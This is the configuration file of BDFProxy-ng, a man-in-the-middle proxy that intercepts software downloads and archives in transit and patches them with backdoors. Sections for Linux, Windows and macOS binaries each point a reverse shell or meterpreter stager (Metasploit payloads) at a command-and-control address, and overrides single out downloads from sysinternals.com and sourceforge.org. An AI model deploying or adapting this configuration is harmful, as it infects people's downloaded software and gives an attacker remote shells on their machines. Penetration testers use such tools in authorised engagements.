##############################################################################
#    BDFProxy-ng                                                             #
#    Copyright (C) 2015  Davide `Anathema` Barbato                           #
#                                                                            #
#    This program is free software; you can redistribute it and/or modify    #
#    it under the terms of the GNU General Public License as published by    #
#    the Free Software Foundation; either version 3 of the License.          #
#                                                                            #
#    This program is distributed in the hope that it will be useful,         #
#    but WITHOUT ANY WARRANTY; without even the implied warranty of          #
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
#    GNU General Public License for more details.                            #
#                                                                            #
#    You should have received a copy of the GNU General Public License       #
#    along with this program; if not, write to the Free Software Foundation, #
#    Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA       #
##############################################################################

[Overall]
proxyMode = transparent  # Modes: None, socks5, transparent, reverse, upstream
MaxSizeFileRequested = 100000000 # will send a 502 request of large content to the client (server error)
certLocation = ~/.mitmproxy/mitmproxy-ca.pem
proxyPort = 8080
sslports = 443, 8443
loglevel = INFO
logname = proxy.log
resourceScriptFile = bdfproxy_msf_resource.rc


[hosts]
#whitelist host/IP - patch these only. 
#ALL is everything, use the blacklist to leave certain hosts/IPs out

whitelist = ALL

#Hosts that are never patched, but still pass through the proxy. You can include host and ip, recommended to do both.

blacklist = ,   # a comma is null do not leave blank


[keywords]
#These checks look at the path of a url for keywords

whitelist = ALL

#For blacklist note binaries that you do not want to touch at all

# Also applied in zip files

blacklist = Tcpview.exe, skype.exe, .dll


[ZIP]
# patchCount is the max number of files to patch in a zip file
# After the max is reached it will bypass the rest of the files 
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 40000000

blacklist = .dll,  #don't do dlls in a zip file

[AR]
# patchCount is the max number of files to patch in an ar file
# After the max is reached it will bypass the rest of the files
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 40000000

blacklist = ,  #don't do dlls in a ar file

[LZMA]
# patchCount is the max number of files to patch in an lzma file
# After the max is reached it will bypass the rest of the files
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 40000000

blacklist = .dll,  #don't do dlls in a ar file

[TAR]
# patchCount is the max number of files to patch in a tar file
# After the max is reached it will bypass the rest of the files
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 60000000

blacklist = ,   # a comma is null do not leave blank

[targets]
	# MAKE SURE that your settings for host and port DO NOT
	# overlap between different types of payloads
	
	[[ALL]] # DEFAULT settings for all targets REQUIRED
	
	LinuxType = ALL 	# choices: x86/x64/ALL/None
	WindowsType = ALL 	# choices: x86/x64/ALL/None
	FatPriority = x64   # choices: x86 or x64
	
	FileSizeMax = 60000000  # ~60 MB (just under) No patching of files this large

	CompressedFiles = True #True/False
		[[[LinuxIntelx86]]]
		SHELL = reverse_shell_tcp   # This is the BDF syntax
		HOST = 192.168.8.129 		# The C2
		PORT = 8888
		SUPPLIED_SHELLCODE = None
		MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
		
		[[[LinuxIntelx64]]]
		SHELL = reverse_shell_tcp
		HOST = 192.168.8.129
		PORT = 9999
		SUPPLIED_SHELLCODE = None
		MSFPAYLOAD = linux/x64/shell_reverse_tcp

		[[[WindowsIntelx86]]]
		PATCH_TYPE = SINGLE #JUMP/SINGLE/APPEND
		# PATCH_METHOD overwrites PATCH_TYPE with jump
		PATCH_METHOD = automatic
		HOST = 192.168.8.129
		PORT = 8443
		SHELL = iat_reverse_tcp_stager_threaded
		SUPPLIED_SHELLCODE = None
		ZERO_CERT = False
		PATCH_DLL = True
		MSFPAYLOAD = windows/meterpreter/reverse_tcp

		[[[WindowsIntelx64]]]
		PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
		# PATCH_METHOD overwrites PATCH_TYPE with jump
		PATCH_METHOD = automatic
		HOST = 192.168.8.129
		PORT = 8088
		SHELL = iat_reverse_tcp_stager_threaded
		SUPPLIED_SHELLCODE = None
		ZERO_CERT = True
		PATCH_DLL = False
		MSFPAYLOAD = windows/x64/shell/reverse_tcp

		[[[MachoIntelx86]]]
		SHELL = reverse_shell_tcp
		HOST = 192.168.8.129
		PORT = 4444
		SUPPLIED_SHELLCODE = None
		MSFPAYLOAD = linux/x64/shell_reverse_tcp

		[[[MachoIntelx64]]]
		SHELL = reverse_shell_tcp
		HOST = 192.168.8.129
		PORT = 5555
		SUPPLIED_SHELLCODE = None
		MSFPAYLOAD = linux/x64/shell_reverse_tcp

	# Call out the difference for targets here as they differ from ALL
	# These settings override the ALL settings
	
	[[sysinternals.com]]
	LinuxType = None
	WindowsType = x86
	CompressedFiles = False
	#inherits WindowsIntelx32 from ALL
		[[[WindowsIntelx86]]]
		PATCH_DLL = False
		ZERO_CERT = True

	[[sourceforge.org]]
	WindowsType = x64
	CompressedFiles = False

		[[[WindowsIntelx64]]]
		PATCH_DLL = False

		[[[WindowsIntelx86]]]
		PATCH_DLL = False
